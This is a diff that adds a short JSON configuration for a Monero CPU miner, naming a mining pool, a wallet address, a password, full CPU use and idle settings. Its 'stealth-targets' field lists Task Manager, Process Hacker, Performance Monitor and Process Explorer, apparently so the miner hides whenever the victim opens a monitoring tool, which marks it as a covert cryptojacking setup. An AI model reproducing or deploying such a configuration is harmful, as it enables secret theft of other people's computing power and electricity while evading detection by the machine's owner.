@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "xmr.2miners.com",
+    "port": 12222,
+    "wallet": "48S6pGGb8QHTh15ppF4fGRJc1TKyoWDpZbnwhbmtDBF4chMDfwZFs3N9FAUSZrxtc7MrYGbNYDn3ydGTUdUz3JwpRPwCaq5",
+    "password": "Punchy39",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 100,
+    "idle-wait": 5,
+    "idle-cpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
